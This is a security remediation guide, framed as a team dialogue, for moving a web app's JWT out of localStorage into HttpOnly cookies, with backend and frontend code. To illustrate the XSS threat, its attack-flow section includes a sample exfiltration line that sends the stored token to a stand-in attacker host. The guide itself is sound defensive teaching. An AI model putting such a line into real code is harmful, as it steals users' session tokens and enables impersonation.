# Issue #3 — JWT Stored in localStorage (XSS Vulnerability)

> **Branch**: 7 (requires coordinated backend + frontend change)  
> **Severity**: 🔴 Critical — every token can be stolen if any dependency has an XSS bug

---

## 👥 The Team Room

*It's the weekly security review. Sam (Security), Ben (Backend), and Fay (Frontend) are in the room.*

---

**🟣 Sam (Security):** "Fay, where is the JWT token stored after login?"

**🔵 Fay (Frontend):** "In localStorage. `localStorage.setItem('token', data.token)`. It's been there since day one."

**🟣 Sam:** "Okay. Open your browser's DevTools right now. Go to Application → Local Storage. Can you see the token?"

**🔵 Fay:** "...yes."

**🟣 Sam:** "Now open the Console tab. Type: `localStorage.getItem('token')`. What do you see?"

**🔵 Fay:** "I see the full JWT token string."

**🟣 Sam:** "Now imagine that instead of you typing that, a malicious script injected into your page typed that. Maybe through a dependency with an XSS vulnerability. NPM has had incidents where popular packages were compromised. That script would capture your token, send it to `evil.com`, and the attacker could make API requests as you — forever, until the token expires in 12 hours."

**🟠 Ben (Backend):** "How likely is that actually?"

**🟣 Sam:** "Unlikely for you right now with 50 users. But at 10,000 users, you become a target. And XSS attacks in npm packages do happen. Google 'event-stream npm hack' or 'ua-parser-js compromise'. When they happen, they hit every app using that package. The defense is simple."

**🔵 Fay:** "What's the fix?"

**🟣 Sam:** "HttpOnly cookies. You move the token from localStorage (visible to JavaScript) to an HttpOnly cookie (invisible to JavaScript). The browser still sends it automatically on every request, but no JavaScript — not yours, not injected — can read it."

---

## 🔍 Understanding the Problem First

### What is localStorage?

`localStorage` is a storage area in your browser. It's like a key-value store:
```js
localStorage.setItem("token", "abc123");
localStorage.getItem("token"); // "abc123"
```

**Key property**: Any JavaScript running on your page can access it. This includes third-party scripts.

### What is an XSS Attack?

XSS = Cross-Site Scripting. An attacker finds a way to inject their own JavaScript into your page. Then their script runs with the same access as your code.

**How injection happens**:
1. **Dependency compromise**: A popular npm package you use gets hacked. The malicious version ships code that reads localStorage.
2. **Stored XSS**: If you ever display user-submitted content (job descriptions, profile text) without sanitizing it, an attacker can store `<script>evil code</script>` in your DB.
3. **Reflected XSS**: URL parameters rendered directly in the page.

**The attack flow**:
```
1. Attacker compromises small npm package (e.g., a date formatting library)
2. Attacker adds: fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
3. Any user of YOUR app who installed the new version of that package runs the evil code
4. Attacker collects tokens. Can impersonate users.
```

### Why HttpOnly Cookies Are the Fix

An `HttpOnly` cookie is **invisible to JavaScript**. It's set by the server and the browser sends it automatically on every request to that domain — but `document.cookie` cannot read it and JavaScript cannot access it at all.

```
With localStorage:
- You: localStorage.getItem('token') → "abc123" ✅
- Attacker's script: localStorage.getItem('token') → "abc123" ❌ (they can steal it)

With HttpOnly cookie:
- You: document.cookie → "" (empty — cookie is hidden from JS) ✅
- Attacker's script: document.cookie → "" ❌ (can't steal what they can't see)
- Browser: sends the cookie header automatically on every request ✅
```

---

## 🛠 Step-by-Step Fix

This is a **coordinated change** — backend and frontend must change together. Don't do one without the other.

### Step 1: Backend — Set Cookies Instead of Returning Tokens in JSON

In `backend/routes/authRoutes.js`, find every place that returns a JWT in the response body. Replace with `res.cookie()`:

```js
// BEFORE (in every login/register route):
const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, {
  expiresIn: "12h",
});
res.json({ token, user: { id, name, email, role } });

// AFTER:
const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, {
  expiresIn: "12h",
});

// Set HttpOnly cookie — JavaScript cannot read this
res.cookie("token", token, {
  httpOnly: true,           // Cannot be read by JavaScript
  secure: process.env.NODE_ENV === "production", // HTTPS only in production
  sameSite: "strict",       // Not sent with cross-site requests (CSRF protection)
  maxAge: 12 * 60 * 60 * 1000, // 12 hours in milliseconds
});

// Don't put the token in the body — only user info
res.json({ user: { id: user._id, name: user.name, email: user.email, role: user.role } });
```

### Step 2: Backend — Update Auth Middleware to Read from Cookie

In `backend/middleware/authMiddleware.js`:

```js
// BEFORE:
const token = req.headers.authorization?.split(" ")[1];

// AFTER (read from cookie, with fallback to header for API clients):
const token = req.cookies?.token || req.headers.authorization?.split(" ")[1];
```

Also install `cookie-parser`:
```bash
cd backend && npm install cookie-parser
```

In `server.js`, add BEFORE routes:
```js
const cookieParser = require("cookie-parser");
app.use(cookieParser());
```

### Step 3: Backend — Logout Should Clear the Cookie

```js
router.post("/logout", (req, res) => {
  res.clearCookie("token", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
  });
  res.json({ message: "Logged out successfully" });
});
```

### Step 4: Frontend — Remove All localStorage Token Usage

In `AuthContext.jsx`, remove:
```js
// DELETE these lines:
localStorage.setItem("token", token);
localStorage.removeItem("token");
const savedToken = localStorage.getItem("token");
```

Update `axiosInstance.js` — remove the token header interceptor:
```js
// BEFORE: manually adds Authorization header from localStorage
axiosInstance.interceptors.request.use((config) => {
  const token = localStorage.getItem("token");
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// AFTER: just enable cookies (browser sends them automatically)
const axiosInstance = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  withCredentials: true, // THIS is the key line — send cookies with every request
});
// No interceptor needed — cookies are sent automatically
```

### Step 5: Backend — CORS Must Allow Credentials

In `server.js`, update the CORS configuration:
```js
app.use(cors({
  origin: [
    "http://localhost:5173",
    "https://axon-hire.vercel.app",
    // Add your exact frontend URL — NOT "*" (asterisk won't work with credentials)
  ],
  credentials: true, // Allow cookies to be sent cross-origin
}));
```

### Step 6: Test It

1. Log in through the frontend
2. Open DevTools → Application → Cookies
3. You should see a cookie named `token` with `HttpOnly` checked ✅
4. Open Console, type `document.cookie` — you should NOT see the token ✅
5. Open DevTools → Application → Local Storage — there should be no token there ✅
6. Refresh the page — you should still be logged in (cookie persists) ✅

---

## ❓ Questions You're Probably Asking

**Q: What about the Google OAuth flow? That returns a token to the frontend too.**  
A: Update `googleAuthRoutes.js` the same way — after Google verifies the user, set the cookie and redirect to the frontend without the token in the URL.

**Q: If the browser sends the cookie automatically, how does the server know which user it is?**  
A: The cookie contains the JWT. The server reads `req.cookies.token`, verifies it with `jwt.verify()`, and extracts the user ID. Same as before — just reading from a different place.

**Q: Does this break anything for mobile apps or API clients?**  
A: Cookies don't work well with native mobile apps. The `Authorization` header fallback in the middleware (`|| req.headers.authorization?.split(" ")[1]`) handles this case. Mobile apps send the header, web browsers send the cookie.

**Q: What's the `sameSite: "strict"` option?**  
A: It prevents the cookie from being sent when the request originates from another website. This stops CSRF attacks (see Issue #7). Without it, a malicious website could trick your browser into making requests to your API using your cookie.

---

## 🎓 What You Just Learned

- `localStorage` is readable by any JavaScript — including injected malicious scripts
- `HttpOnly` cookies cannot be read by JavaScript — only sent by the browser
- `withCredentials: true` in Axios tells the browser to include cookies in cross-origin requests
- CORS `credentials: true` must match `withCredentials: true` — one without the other doesn't work
- `sameSite: "strict"` gives you free CSRF protection for browser-based requests
